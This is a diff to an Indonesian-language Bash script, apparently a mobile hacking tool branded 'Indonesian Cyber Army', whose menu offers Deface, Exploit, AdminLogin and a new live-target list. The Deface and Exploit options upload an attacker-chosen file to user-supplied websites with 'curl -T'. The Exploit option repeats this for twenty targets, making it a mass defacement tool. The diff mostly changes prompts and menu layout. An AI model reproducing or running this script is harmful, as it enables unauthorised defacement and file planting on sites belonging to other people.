@@ -18,16 +18,18 @@ echo $cyan" ["$red"+"$cyan"]Team        : Indonesian Cyber Army		"
 echo $cyan" ["$red"+"$cyan"]Blog        : http://generasicyberindo.blogspot.com"
 echo $cyan" ["$red"+"$cyan"]Github	: https://github.com/21D4N404"
 echo $cyan" ["$white"NOTE : Simpan script di memory internal"$cyan"]"
-echo $cyan* [*$white*       Di luar folder jngan di dalam folder
+echo $cyan" ["$white"Di luar folder jngan di dalam folder"$cyan"]"
 echo $purple"___________________________________________________"
-echo $red"	~"$cyan"{"$white"1"$cyan"}"$white".Deface"$cyan"		{"$white"Q"$cyan"}"$white"Quit "
+echo $red"	~"$cyan"{"$white"1"$cyan"}"$white".Deface"$cyan"
 echo $red"	~"$cyan"{"$white"2"$cyan"}"$white".Exploit"$cyan
 echo $red"	~"$cyan"{"$white"3"$cyan"}"$white".AdminLogin"$cyan
+echo $red"  ~"$cyan"{"$white"Q"$cyan"}"$white"Quit "
 echo $purple"___________________________________________________"
 echo $red"	~"$cyan"{"$white"T"$cyan"}"$white".TUTORIAL"$cyan
+echo $red"	~"$cyan"{"$white"L"$cyan"}"$white".LIVETARGET"$cyan
 echo $purple"___________________________________________________"
 echo $white "╭─"$green"Chemod@zrd404"$cyan" ~/IndoCyber"$white
-read -p " ╰─☆ "  apaan
+read -p " ╰─$ "  apaan
 
 if [ $apaan = "1" ] || [ $apaan = "a" ]
 then
@@ -35,10 +37,10 @@ echo "                                          "
 figlet -f future Deface
 echo $green "Masukan Target !!!! "
 echo $white "╭─"$green"Chemod@zrd404"$cyan" ~/IndoCyber"$white
-read -p " ╰─☆ "  target
+read -p " ╰─$ "  target
 echo $green "Masukan Script !!!! "
 echo $white "╭─"$green"Chemod@zrd404"$cyan" ~/IndoCyber"$white
-read -p " ╰─☆ "  script
+read -p " ╰─$ "  script
 curl -T /storage/emulated/0/$script $target
 echo $red "[+]>>>>> = $target/$script "
 echo $cyan"["$yellow"B"$cyan"]"$white"back "$cyan"["$yellow"Q"$cyan"]"$white"Quit"
@@ -53,105 +55,105 @@ figlet -f future "EXPLOIT"
 echo "### ctrl + c to quit ###"
 echo "Masukan Script !!!!"
 echo $white "╭─"$green"Chemod@zrd404"$cyan" ~/IndoCyber"$white                               
-read -p " ╰─☆ " script
+read -p " ╰─$ " script
 echo "Masukan Target1 !!!!"
 echo $white "╭─"$green"Chemod@zrd404"$cyan" ~/IndoCyber"$white
-read -p " ╰─☆ " target1
+read -p " ╰─$ " target1
 curl -T /storage/emulated/0/$script $target1
 echo $cyan"["$green"+"$cyan"]"$red"$target1/$script"
 echo "Masukan Target2 !!!!"
 echo $white "╭─"$green"Chemod@zrd404"$cyan" ~/IndoCyber"$white
-read -p " ╰─☆ " target2
+read -p " ╰─$ " target2
 curl -T /storage/emulated/0/$script $target2
 echo $cyan"["$green"+"$cyan"]"$red"$target2/$script"
 echo "Masukan Target3 !!!!"
 echo $white "╭─"$green"Chemod@zrd404"$cyan" ~/IndoCyber"$white
-read -p " ╰─☆ " target3
+read -p " ╰─$ " target3
 curl -T /storage/emulated/0/$script $target3
 echo $cyan"["$green"+"$cyan"]"$red"$target3/$script"
 echo "Masukan Target4 !!!!"
 echo $white "╭─"$green"Chemod@zrd404"$cyan" ~/IndoCyber"$white
-read -p " ╰─☆ " target4
+read -p " ╰─$ " target4
 curl -T /storage/emulated/0/$script $target4
 echo $cyan"["$green"+"$cyan"]"$red"$target4/$script"
 echo "Masukan Target5 !!!!"
 echo $white "╭─"$green"Chemod@zrd404"$cyan" ~/IndoCyber"$white
-read -p " ╰─☆ " target5
+read -p " ╰─$ " target5
 curl -T /storage/emulated/0/$script $target5
 echo $cyan"["$green"+"$cyan"]"$red"$target5/$script"
 echo "Masukan Target6 !!!!"
 echo $white "╭─"$green"Chemod@zrd404"$cyan" ~/IndoCyber"$white
-read -p " ╰─☆ " target6
+read -p " ╰─$ " target6
 curl -T /storage/emulated/0/$script $target6
 echo $cyan"["$green"+"$cyan"]"$red"$target6/$script"
 echo "Masukan Target7 !!!!"
 echo $white "╭─"$green"Chemod@zrd404"$cyan" ~/IndoCyber"$white
-read -p " ╰─☆ " target7
+read -p " ╰─$ " target7
 curl -T /storage/emulated/0/$script $target7
 echo $cyan"["$green"+"$cyan"]"$red"$target7/$script"
 echo "Masukan Target8 !!!!"
 echo $white "╭─"$green"Chemod@zrd404"$cyan" ~/IndoCyber"$white
-read -p " ╰─☆ " target8
+read -p " ╰─$ " target8
 curl -T /storage/emulated/0/$script $target8
 echo $cyan"["$green"+"$cyan"]"$red"$target8/$script"
 echo "Masukan Target9 !!!!"
 echo $white "╭─"$green"Chemod@zrd404"$cyan" ~/IndoCyber"$white
-read -p " ╰─☆ " target9
+read -p " ╰─$ " target9
 curl -T /storage/emulated/0/$script $target9
 echo $cyan"["$green"+"$cyan"]"$red"$target9/$script"
 echo "Masukan Target10 !!!! "
 echo $white "╭─"$green"Chemod@zrd404"$cyan" ~/IndoCyber"$white
-read -p " ╰─☆ " target10
+read -p " ╰─$ " target10
 curl -T /storage/emulated/0/$script $target10
 echo $cyan"["$green"+"$cyan"]"$red"$target10/$script"
 echo "Masukan Target11 !!!! "
 echo $white "╭─"$green"Chemod@zrd404"$cyan" ~/IndoCyber"$white
-read -p " ╰─☆ " target11
+read -p " ╰─$ " target11
 curl -T /storage/emulated/0/$script $target11
 echo $cyan"["$green"+"$cyan"]"$red"$target11/$script"
 echo "Masukan Target12 !!!! "
 echo $white "╭─"$green"Chemod@zrd404"$cyan" ~/IndoCyber"$white
-read -p " ╰─☆ " target12
+read -p " ╰─$ " target12
 curl -T /storage/emulated/0/$script $target12
 echo $cyan"["$green"+"$cyan"]"$red"$target12/$script"
 echo "Masukan Target13 !!!! "
 echo $white "╭─"$green"Chemod@zrd404"$cyan" ~/IndoCyber"$white
-read -p " ╰─☆ " target13
+read -p " ╰─$ " target13
 curl -T /storage/emulated/0/$script $target13
 echo $cyan"["$green"+"$cyan"]"$red"$target13/$script"
 echo "Masukan Target14 !!!! "
 echo $white "╭─"$green"Chemod@zrd404"$cyan" ~/IndoCyber"$white
-read -p " ╰─☆ " target14
+read -p " ╰─$ " target14
 curl -T /storage/emulated/0/$script $target14
 echo $cyan"["$green"+"$cyan"]"$red"$target14/$script"
 echo "Masukan Target15 !!!! "
 echo $white "╭─"$green"Chemod@zrd404"$cyan" ~/IndoCyber"$white
-read -p " ╰─☆ " target15
+read -p " ╰─$ " target15
 curl -T /storage/emulated/0/$script $target15
 echo $cyan"["$green"+"$cyan"]"$red"$target15/$script"
 echo "Masukan Target16 !!!! "
 echo $white "╭─"$green"Chemod@zrd404"$cyan" ~/IndoCyber"$white
-read -p " ╰─☆ " target16
+read -p " ╰─$ " target16
 curl -T /storage/emulated/0/$script $target16
 echo $cyan"["$green"+"$cyan"]"$red"$target16/$script"
 echo "Masukan Target17 !!!! "
 echo $white "╭─"$green"Chemod@zrd404"$cyan" ~/IndoCyber"$white
-read -p " ╰─☆ " target17
+read -p " ╰─$ " target17
 curl -T /storage/emulated/0/$script $target17
 echo $cyan"["$green"+"$cyan"]"$red"$target17/$script"
 echo "Masukan Target18 !!!! "
 echo $white "╭─"$green"Chemod@zrd404"$cyan" ~/IndoCyber"$white
-read -p " ╰─☆ " target18
+read -p " ╰─$ " target18
 curl -T /storage/emulated/0/$script $target18
 echo $cyan"["$green"+"$cyan"]"$red"$target18/$script"
 echo "Masukan Target19 !!!! "
 echo $white "╭─"$green"Chemod@zrd404"$cyan" ~/IndoCyber"$white
-read -p " ╰─☆ " target19
+read -p " ╰─$ " target19
 curl -T /storage/emulated/0/$script $target19
 echo $cyan"["$green"+"$cyan"]"$red"$target19/$script"
 echo "Masukan Target20 !!!! "
 echo $white "╭─"$green"Chemod@zrd404"$cyan" ~/IndoCyber"$white
-read -p " ╰─☆ " target20
+read -p " ╰─$ " target20
 curl -T /storage/emulated/0/$script $target20
 echo $cyan"["$green"+"$cyan"]"$red"$target20/$script"
 echo $cyan"["$yellow"B"$cyan"]"$white"back "$cyan"["$yellow"Q"$cyan"]"$white"Quit"
@@ -186,7 +188,15 @@ fi
 if [ $apaan = "T" ] || [ $apaan = "t" ]
 then
 cat tutorial.txt
-exit
+echo $cyan"["$yellow"B"$cyan"]"$white"back "$cyan"["$yellow"Q"$cyan"]"$white"Quit"
+read -p "[B/Q] " back
+fi
+
+if [ $apaan = "L" ] || [ $apaan = "t" ]
+then
+cat Livetarget.txt
+echo $cyan"["$yellow"B"$cyan"]"$white"back "$cyan"["$yellow"Q"$cyan"]"$white"Quit"
+read -p "[B/Q] " back
 fi
 
 if [ $apaan = "Q" ] || [ $apaan = "q" ]
@@ -199,7 +209,7 @@ fi
 
 if [ $back = "B" ] || [ $back = "b" ]
 then
-sh AOC.sh
+sh ICA.sh
 fi
 
 if [ $back = "Q" ] || [ $back = "q" ]
